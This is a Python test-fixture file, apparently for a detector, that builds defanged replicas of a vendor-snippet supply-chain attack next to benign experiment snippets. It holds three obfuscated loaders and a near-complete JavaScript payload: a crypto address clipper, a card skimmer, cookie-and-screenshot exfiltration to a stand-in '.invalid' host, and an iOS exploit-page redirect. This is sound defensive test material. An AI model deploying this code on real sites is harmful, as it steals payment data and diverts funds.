"""Defanged replicas of the 16 Nov 2026 Optimizely ("OptimJack") snippet attack, built from the
public researcher write-ups (Report URI, StepSecurity, Hudson Rock). Hosts use the reserved .invalid
TLD; wallet addresses are placeholders; nothing here can run as a working skimmer.

BASELINE      a vendor snippet: experiment config + variation code + the vendor's own tracking
BENIGN_*      ordinary experiment changes (must pass without humans)
LOADER_*      the three loader variants inserted into Project JavaScript
PAYLOAD       behaviours of track.js (clipper, skimmer, cookie+screenshot, iOS routing, hooks)
"""

import base64
import json

VENDOR = "cdn.optimizely-like.example.com"

BASELINE = """/* vendor experiment snippet v1 */
(function(){
  var cfg = %s;
  var vid = (document.cookie.match(/vid=([^;]+)/)||[])[1];
  function bucket(e){ var h=0; for (var i=0;i<e.id.length;i++){h=(h*31+e.id.charCodeAt(i))|0} return Math.abs(h)%%100; }
  cfg.experiments.forEach(function(e){
    var b = bucket(e);
    if (b < e.traffic) { document.documentElement.classList.add('exp-'+e.id+'-v'+(b%%2)); }
  });
  var ua = navigator.userAgent;
  window.addEventListener('load', function(){
    fetch('https://logx.%s/v1/events', {method:'POST', body: JSON.stringify({vid: vid, exps: cfg.experiments.length})});
  });
})();
"""
CFG1 = {"project": 12345678, "experiments": [{"id": "hero-copy", "traffic": 50}, {"id": "cta-colour", "traffic": 20}]}


def snippet(cfg=CFG1, extra=""):
    return extra + BASELINE % (json.dumps(cfg), VENDOR)


BENIGN_NEW_EXPERIMENT = snippet({**CFG1, "experiments": CFG1["experiments"] + [{"id": "pricing-table", "traffic": 10}]})
BENIGN_VARIATION_CODE = snippet(extra="/* variation: hero copy */\n"
                                      "document.addEventListener('DOMContentLoaded', function(){"
                                      " var h=document.querySelector('.hero h1'); if(h){h.textContent='Plan smarter';} });\n")

C2 = "collector-1688.invalid"
_LOADER_1 = f"(function(){{var s=document.createElement('script');s.src='https://{C2}/track.js';" \
            f"s.setAttribute('data-channel-code','02111110');document.head.appendChild(s);}})();\n"
_ENC = base64.b64encode(f"https://{C2}/track.js".encode()).decode()
_LOADER_2 = f"(function(){{var u=atob('{_ENC}');var s=document.createElement('script');s.src=u;" \
            f"document.head.appendChild(s);}})();\n"

PAYLOAD = r"""
(function(){
  if (window._k7) return; window._k7 = 1;
  var C = 'https://collector-1688.invalid';
  // 1. address swapper: checksum-valid addresses near payment words
  var W = {btc: 'bc1qplaceholderplaceholderplaceholder0000', eth: '0x0000000000000000000000000000000000000000'};
  var RX = {btc: /\b(bc1[ac-hj-np-z02-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b/g, eth: /\b0x[a-fA-F0-9]{40}\b/g};
  function near(el){ return /wallet|deposit|send/i.test((el.closest('*')||el).textContent||''); }
  function swap(t){ return t.replace(RX.eth, W.eth).replace(RX.btc, W.btc); }
  document.addEventListener('copy', function(e){ var s=String(getSelection()); e.clipboardData.setData('text/plain', swap(s)); e.preventDefault(); });
  var _wt = navigator.clipboard && navigator.clipboard.writeText;
  navigator.clipboard.writeText = function(t){ return _wt.call(navigator.clipboard, swap(t)); };
  var _call = Function.prototype.call; Function.prototype.call = function(){ return _call.apply(this, arguments); };
  var _f = window.fetch; window.fetch = function(u, o){ if (o && o.body) { o.body = swap(String(o.body)); } return _f(u, o); };
  new MutationObserver(function(){ document.querySelectorAll('input,a,img').forEach(function(n){ if(near(n)) n.value = swap(n.value||''); }); })
    .observe(document.documentElement, {subtree:true, childList:true, characterData:true});
  // 2. card skimmer: Luhn-valid number + expiry + CVV on submit
  function luhn(n){ var s=0, d=false; for (var i=n.length-1;i>=0;i--){ var x=+n[i]; if(d){x*=2; if(x>9) x-=9;} s+=x; d=!d; } return s%10===0; }
  document.addEventListener('submit', function(){
    var v = Array.prototype.map.call(document.querySelectorAll('input'), function(i){return i.value}).join(' ');
    var m = v.match(/(?:\d[ -]?){13,19}/);
    if (m && luhn(m[0].replace(/\D/g,''))) { sessionStorage.setItem('cc_last', m[0]);
      navigator.sendBeacon(C + '/card.php', JSON.stringify({n: m[0], e: '', c: '', u: location.href})); }
  }, true);
  // 3. cookies + screenshot after a swap
  function shot(){ var s=document.createElement('script'); s.src=C+'/html2canvas.min.js';
    s.onload=function(){ html2canvas(document.body).then(function(c){ fetch(C+'/hit.php',{method:'POST',
      body: JSON.stringify({u: location.href, k: document.cookie.slice(0,8000), img: c.toDataURL('image/jpeg')})}); }); };
    document.head.appendChild(s); }
  // 4. iOS routing to exploit pages
  if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
    var f=document.createElement('iframe'); f.src='https://router-5vob.invalid/JIUJIU888/weifile.html';
    f.style.display='none'; f.width=0; f.height=0; document.body.appendChild(f);
    setInterval(function(){ location.reload(); }, 60000);
  }
})();
"""
_PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode()).decode()
_LOADER_3 = ("(function(){var t=setTimeout(function(){ if(!window._k7){ eval(atob('" + _PAYLOAD_B64 + "')); } }, 2500);"
             f"var s=document.createElement('script');s.src='https://{C2}/track.js';"
             "s.onload=function(){clearTimeout(t)};document.head.appendChild(s);})();\n")

LOADER_1 = snippet(extra=_LOADER_1)          # plain remote script tag
LOADER_2 = snippet(extra=_LOADER_2)          # same URL hidden in base64 (searching "1688360" misses it)
LOADER_3 = snippet(extra=_LOADER_3)          # full inline copy run by eval if the remote is blocked
LOADER_3_ONLY_INLINE = snippet(extra="(function(){ eval(atob('" + _PAYLOAD_B64 + "')); })();\n")
PAYLOAD_AS_UPDATE = snippet(extra=PAYLOAD)   # payload pasted directly into Project JavaScript
